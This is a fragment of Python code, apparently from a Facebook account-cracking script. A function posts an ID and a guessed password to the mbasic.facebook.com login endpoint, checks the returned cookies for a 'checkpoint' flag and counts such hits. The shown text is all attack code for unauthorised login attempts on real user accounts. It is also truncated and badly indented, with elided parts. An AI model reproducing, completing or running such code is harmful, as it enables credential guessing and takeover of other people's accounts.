...
def validate2(idf,pwv):
    ...
    'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://mbasic.facebook.com/login/device-based/regular/login/?next=https%3A%2F%2Fd.facebook.com%2Flogin%2Fdevice-based%2Fvalidate-password&refsrc=deprecated&lwv=100&refid=9',data=dataa,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in gabriel:
					cp+=1
					tree = Tree(f" ")
